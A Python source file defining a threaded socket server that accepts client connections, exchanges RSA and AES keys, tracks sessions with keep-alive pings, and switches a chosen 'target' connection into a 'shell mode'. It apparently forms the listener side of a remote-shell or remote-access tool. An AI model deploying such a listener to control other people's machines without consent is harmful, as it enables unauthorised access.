from CryptoAC.Asymmetric.Rsa import RSA
from CryptoAC.Symmetric.AcAes import AesCrypto
from .ConnectionsManager import ConnectionManager
from Tools.toolsF import randombyte
from Tools.internalServer import InternalServer
import socket
import time
import threading



class Server(object):
    
    def __init__(self,PrivateKey,port):
        print("server started!")
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ServInfo = (
            socket.gethostbyname(socket.gethostname())
            ,port
        )
        self.connections = ConnectionManager()
        self.rsa = RSA()
        self.PrivateKey = PrivateKey
        self.rsaBlock = (PrivateKey['n'].bit_length()+7)//8
        self.sleepPerPing = 60
        self.sleepPeriter = 2 
        self.internalSrv = InternalServer(self.connections)  
        self.internalSrv.start()
       
    def setCipher(self,conn, id):
        msg = conn.recv(self.rsaBlock)
        key = self.rsa.decrypt(
            self.PrivateKey,
            msg
        )
        self.connections.addAesToconnection(
            id,
            AesCrypto(key, None)
        ) 


    def ping(self, conn, id, timeout=5):
        try:
            conn.send(randombyte())
            conn.settimeout(timeout)
            response = conn.recv(3)
            conn.settimeout(None)
            if response:
                return True
        except (socket.timeout, ConnectionResetError, BrokenPipeError, OSError):
            pass
        if self.connections.isconnected(id):
            return True
        return False
    

    def keepAlive(self, conn, id, timeout=5):
        def __internal__():
            while True:
                if not self.connections.isconnected(id):
                    if not self.ping(conn=conn,id=id,timeout=timeout):
                        self.connections.removeConnection(conn)
                time.sleep(self.sleepPerPing)
        threading.Thread(target=__internal__).start()
                
    
    def onConnect(self,conn,addr):
        clientInfo = self.retriveClientInfo(conn)
        id = self.connections.getId(clientInfo, addr[0])
        self.connections.insertNewConnction(conn, clientInfo)
        self.keepAlive(conn=conn, id=id)
        while True:
            if self.connections.connctTo == id:
                self.connections.connectToTarget(conn, id)
                self._setShellMode(conn, id)
            elif not self.connections.alive(id):
                return
            time.sleep(self.sleepPeriter)
                               

    def _setShellMode(self,conn, id):
        self.setCipher(conn,id)
        while self.connections.isconnected(id):
            time.sleep(5)

    def retriveClientInfo(self,conn):
        # header = int.from_bytes(conn.recv(4))
        # print(header)
        data = self.rsa.decrypt(self.PrivateKey,conn.recv(self.rsaBlock))
        # while len(data) < header:
        #     print(True)
        #     data += self.rsa.decrypt(self.PrivateKey,conn.recv(self.rsaBlock))
        return data
            
        
    
    def __listener__(self):
        self.server.bind(self.ServInfo)
        self.server.listen()
        while True:
            conn, addr = self.server.accept()
            threading.Thread(
                target=self.onConnect,
                args=(conn,addr)
            ).start()
            time.sleep(1)

            
    def start(self):
        threading.Thread(target=self.__listener__).start()
        